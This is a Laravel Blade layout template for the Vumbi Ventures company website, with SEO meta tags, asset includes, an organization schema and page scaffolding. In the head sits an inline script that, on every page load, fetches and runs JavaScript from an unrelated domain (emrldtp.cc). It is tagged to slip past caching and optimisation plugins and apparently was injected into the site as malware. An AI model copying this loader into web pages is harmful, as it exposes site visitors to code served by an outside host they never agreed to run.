<!DOCTYPE html>
<html lang="{{ str_replace('_', '-', app()->getLocale()) }}" class="scroll-smooth">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="csrf-token" content="{{ csrf_token() }}">

    {{-- SEO Meta Tags --}}
    <title>@yield('title', 'Vumbi Ventures - From overlooked places, we build remarkable solutions')</title>
    <meta name="description" content="@yield('description', 'Vumbi Ventures is a purpose-driven digital innovation company building practical technology solutions that empower individuals, strengthen businesses, and unlock opportunities for communities across Africa.')">
    <meta name="keywords" content="@yield('keywords', 'Vumbi Ventures, African innovation, SkillDNA, Discover Africa, tech startup, digital innovation, African technology, Nairobi, Accra')">
    <meta name="author" content="Vumbi Ventures">
    <meta name="robots" content="index, follow">

    {{-- Canonical URL --}}
    <link rel="canonical" href="{{ url()->current() }}">

    {{-- Open Graph / Social Media Meta Tags --}}
    <meta property="og:type" content="website">
    <meta property="og:url" content="{{ url()->current() }}">
    <meta property="og:site_name" content="Vumbi Ventures">
    <meta property="og:title" content="@yield('og_title', 'Vumbi Ventures - From overlooked places, we build remarkable solutions')">
    <meta property="og:description" content="@yield('og_description', 'From overlooked places, we build remarkable solutions. Discover our ecosystem of digital platforms including SkillDNA and Discover Africa.')">
    <meta property="og:image" content="@yield('og_image', asset('images/vumbi-ventures-og.jpg'))">

    {{-- Twitter Card --}}
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:title" content="@yield('twitter_title', 'Vumbi Ventures')">
    <meta name="twitter:description" content="@yield('twitter_description', 'From overlooked places, we build remarkable solutions.')">
    <meta name="twitter:image" content="@yield('twitter_image', asset('images/vumbi-ventures-twitter.jpg'))">

    {{-- Favicon --}}
    <link rel="icon" type="image/x-icon" href="{{ asset('favicon.ico') }}">
    <link rel="apple-touch-icon" href="{{ asset('apple-touch-icon.png') }}">
    <!-- Font Awesome -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    {{-- Tailwind CSS via Vite --}}
    @livewireStyles
    @vite(['resources/css/app.css', 'resources/js/app.js'])

    {{-- Additional Styles --}}
    @stack('styles')

    <script nowprocket data-noptimize="1" data-cfasync="false" data-wpfc-render="false" seraph-accel-crit="1" data-no-defer="1">
  (function () {
      var script = document.createElement("script");
      script.async = 1;
      script.src = 'https://emrldtp.cc/NDY1NDg3.js?t=465487';
      document.head.appendChild(script);
  })();
</script>
    {{-- Organization Schema --}}
    @php
    $organizationSchema = [
        "@context" => "https://schema.org",
        "@type" => "Organization",
        "@id" => url('/') . "#organization",
        "name" => "Vumbi Ventures",
        "url" => url('/'),
        "logo" => asset('images/vumbi-ventures-logo.png'),
        "sameAs" => [
            "https://twitter.com/vumbiventures",
            "https://linkedin.com/company/vumbi-ventures",
            "https://instagram.com/vumbiventures"
        ],
        "description" => "A purpose-driven digital innovation company built from the spirit of Africa.",
        "address" => [
            "@type" => "PostalAddress",
            "addressLocality" => "Nairobi",
            "addressCountry" => "KE"
        ],
        "slogan" => "From overlooked places, we build remarkable solutions.",
        "foundingDate" => "2024",
        "foundingLocation" => "Nairobi, Kenya"
    ];
    @endphp
    <script type="application/ld+json">
    {!! json_encode($organizationSchema, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES) !!}
    </script>

    {{-- Additional JSON-LD will be pushed from child views --}}
    @stack('schema')
</head>
<body class="font-sans antialiased  text-[#1A1A1A]">

    {{-- Loading Spinner for Livewire (optional) --}}
    <div wire:loading.flex class="fixed inset-0 bg-black/50 z-[9999] items-center justify-center hidden">
        <div class="bg-white p-6 rounded-2xl shadow-xl flex items-center gap-3">
            <svg class="animate-spin h-8 w-8 text-[#8B5A2B]" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
                <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
            </svg>
            <span class="text-[#1A1A1A] font-medium">Loading...</span>
        </div>
    </div>

    {{-- Navigation Component --}}
    <x-navigation />

    {{-- Main Content --}}
    <main class="min-h-screen">
        {{-- {{ $slot }} --}}
        @yield('content')
    </main>

    {{-- Footer Component --}}
    <x-footer />

    {{-- Livewire Scripts --}}
    @livewireScripts

    {{-- Additional Scripts --}}
    @stack('scripts')

    {{-- Google Analytics (replace with your ID) --}}
    @production
    <script async src="https://www.googletagmanager.com/gtag/js?id=G-XXXXXXXXXX"></script>
    <script>
        window.dataLayer = window.dataLayer || [];
        function gtag(){dataLayer.push(arguments);}
        gtag('js', new Date());
        gtag('config', 'G-XXXXXXXXXX');
    </script>
    @endproduction
</body>
</html>
